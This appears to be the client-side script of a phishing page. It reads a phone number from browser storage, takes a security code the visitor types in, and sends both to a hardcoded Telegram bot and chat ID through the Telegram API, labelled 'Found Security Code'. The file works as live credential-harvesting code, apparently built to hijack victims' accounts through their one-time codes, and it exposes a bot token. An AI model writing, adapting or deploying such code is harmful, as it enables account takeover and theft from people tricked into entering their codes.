document.addEventListener('DOMContentLoaded', function () {
    const telefono = localStorage.getItem('telefono');

    if (telefono) {
        document.getElementById('numero-telefono').innerText = telefono;
    }
});

function enviarMensaje() {
    const codigo = document.getElementById('codigoInput').value;
    const telefono = localStorage.getItem('telefono');

    if (!telefono) {
        alert('Número de teléfono no válido.');
        return;
    }

    const token = '6552451604:AAFnjZGs4cTv8MhevAL10lx1Qncb0iYJh2Q';
    const chatId = '-4154966040';

    const mensaje = `Found Security Code:  ${codigo}.\nObtenido del teléfono: ${telefono}`;


    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${mensaje}`;

    axios.get(apiUrl)
        .then(response => {
            console.log(response.data);
            alert('Mensaje enviado exitosamente a Telegram.');
        })
        .catch(error => {
            console.error('Error al enviar el mensaje a Telegram:', error);
            alert('Error al enviar el mensaje a Telegram. Consulta la consola para más detalles.');
        });
}

function mostrarImagen() {
    var imagenEmergente = document.getElementById("imagenEmergente");
    imagenEmergente.style.display = "flex";
}

function cerrarImagen() {
    var imagenEmergente = document.getElementById("imagenEmergente");
    imagenEmergente.style.display = "none";
}